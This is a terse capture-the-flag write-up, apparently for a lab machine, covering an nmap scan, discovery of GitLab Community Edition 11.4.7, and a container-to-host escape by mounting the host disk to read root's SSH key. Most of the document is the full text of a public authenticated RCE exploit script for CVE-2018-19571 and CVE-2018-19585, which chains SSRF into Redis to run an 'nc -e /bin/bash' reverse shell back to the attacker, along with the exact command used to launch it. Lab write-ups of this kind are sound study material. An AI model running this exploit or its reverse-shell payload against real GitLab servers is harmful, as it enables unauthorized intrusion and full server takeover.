#nmapscan 
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 05:08 EDT
Nmap scan report for 10.10.10.220
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/11%OT=22%CT=1%CU=44142%PV=Y%DS=2%DC=T%G=Y%TM=611393C
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=2%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   98.36 ms  10.10.14.1
2   146.21 ms 10.10.10.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.07 seconds
```
#enumeration 
In port 80 we get a gitlab portal. In it's help panel we came to know the version
```GitLab Community Edition 11.4.7 ```
I also ran gobuster but it was not of any use
then searchud for exploits for this gitlab version and found one in 
```GitLab 11.4.7 - RCE (Authenticated) (2)                                                                                                                                                                    | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                                                                                                                                                  | ruby/webapps/49257.py
```
Now used this one 
```
# Exploit Title: GitLab 11.4.7 RCE (POC)
# Date: 24th December 2020
# Exploit Author: Norbert Hofmann
# Exploit Modifications: Sam Redmond, Tam Lai Yin
# Original Author: Mohin Paramasivam
# Software Link: https://gitlab.com/
# Environment: GitLab 11.4.7, community edition
# CVE: CVE-2018-19571 + CVE-2018-19585

#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
import random


parser = argparse.ArgumentParser(description='GitLab 11.4.7 RCE')
parser.add_argument('-u', help='GitLab Username/Email', required=True)
parser.add_argument('-p', help='Gitlab Password', required=True)
parser.add_argument('-g', help='Gitlab URL (without port)', required=True)
parser.add_argument('-l', help='reverse shell ip', required=True)
parser.add_argument('-P', help='reverse shell port', required=True)
args = parser.parse_args()

username = args.u
password = args.p
gitlab_url = args.g + ":5080"
local_ip = args.l
local_port = args.P

session = requests.Session()

# Get Authentication Token
r = session.get(gitlab_url + "/users/sign_in")
soup = BeautifulSoup(r.text, features="lxml")
token = soup.findAll('meta')[16].get("content")
print(f"[+] authenticity_token: {token}")

login_form = {
    "authenticity_token": token,
    "user[login]": username,
    "user[password]": password,
    "user[remember_me]": "0"
}
r = session.post(f"{gitlab_url}/users/sign_in", data=login_form)

if r.status_code != 200:
    exit(f"Login Failed:{r.text}")

# Create project
import_url = "git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2F.git"
project_name = f'project{random.randrange(1, 10000)}'
project_url = f'{gitlab_url}/{username}'

print(f"[+] Creating project with random name: {project_name}")

form = """\nmulti
    sadd resque:gitlab:queues system_hook_push
    lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {local_ip} {local_port} -e /bin/bash' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
    exec
    exec
    exec\n"""

r = session.get(f"{gitlab_url}/projects/new")
soup = BeautifulSoup(r.text, features="lxml")

namespace_id = soup.find(
    'input', {'name': 'project[namespace_id]'}).get('value')

project_token = soup.findAll('meta')[16].get("content")
project_token = project_token.replace("==", "%3D%3D")
project_token = project_token.replace("+", "%2B")

payload = f"utf8=%E2%9C%93&authenticity_token={project_token}&project%5Bimport_url%5D={import_url}{form}&project%5Bci_cd_only%5D=false&project%5Bname%5D={project_name}&project%5Bnamespace_id%5D={namespace_id}&project%5Bpath%5D={project_name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0"

cookies = {
    'sidebar_collapsed': 'false',
    'event_filter': 'all',
    'hide_auto_devops_implicitly_enabled_banner_1': 'false',
    '_gitlab_session': session.cookies['_gitlab_session'],
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': f'{gitlab_url}/projects',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '398',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
}

print("[+] Running Exploit")
r = session.post(
    gitlab_url+'/projects', data=payload, cookies=cookies, headers=headers, verify=False)
if "The change you requested was rejected." in r.text:
    exit('Exploit failed, check input params')

print('[+] Exploit completed successfully!')
```
ran the exploit to get the user shell
```python3 49334.py -u dddd -p dddddddd -g http://10.10.10.220 -l 10.10.14.33 -P 1234```
Now it was a dockr container 
So you can either use deepsec or you can mount the disk in which linux drive was running I used the later one
I ran **fdisk -l** to know the disk in which linux files were running 
it was /dev/sda2 so i mounted it to a another folder and then got the ssh key of root inside it
then logged into root.

